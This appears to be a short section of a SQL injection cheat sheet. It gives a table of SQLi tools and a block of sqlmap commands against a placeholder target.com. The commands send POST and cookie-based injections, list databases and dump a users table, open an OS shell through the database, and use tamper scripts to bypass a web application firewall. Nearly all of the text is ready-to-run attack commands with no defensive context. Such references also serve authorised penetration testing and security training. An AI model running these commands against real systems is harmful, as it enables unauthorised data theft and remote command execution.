## 🛠️ Tools

| Tool | Use |
|------|-----|
| sqlmap | Automated SQLi detection & exploitation |
| Burp Suite | Manual testing & scanning |
| Havij | GUI-based SQLi tool |
| BBQSQL | Blind SQLi framework |

```bash
# Basic sqlmap
sqlmap -u "https://target.com/page?id=1"

# With POST data
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# With cookies
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"

# Dump database
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
```

